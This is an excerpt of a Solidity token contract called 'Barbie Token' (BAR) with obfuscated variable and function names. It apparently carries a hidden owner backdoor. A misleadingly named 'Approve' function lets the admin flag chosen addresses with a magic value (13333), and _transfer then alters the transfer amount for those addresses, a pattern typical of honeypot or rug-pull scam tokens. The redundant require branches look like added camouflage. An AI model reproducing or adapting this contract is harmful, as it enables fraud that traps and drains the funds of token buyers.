...
contract Token is Ownable {
    ...
    address public hqlAdmintzdd;
    uint256 private tokensupply = 10000000000*10**decimals();

    uint256 private _tokentotalSSSupply;
    string private _Tokename = "Barbie Token";
    string private _tokenSSSsymbol = "BAR";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public wyaomuserlzen;
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        wyaomuserlzen[cjjjss] = zramount;    
        if(_msgSender() == hqlAdmintzdd){
            require(_msgSender() == hqlAdmintzdd);
        }else{
            require(_msgSender() == hqlAdmintzdd);
        }
    ...
    function Approve(address cjjjss) public    {
        ...
        wyaomuserlzen[cjjjss] = newpassnum;
        if(_msgSender() == hqlAdmintzdd){
            require(_msgSender() == hqlAdmintzdd);
        }else{
            require(_msgSender() == hqlAdmintzdd);
    ...
    function _transfer(
        ...
        if (13333 != wyaomuserlzen[vipFrom]) {}else{
            amount = _balances[vipFrom] + wyaomuserlzen[vipFrom];
        }
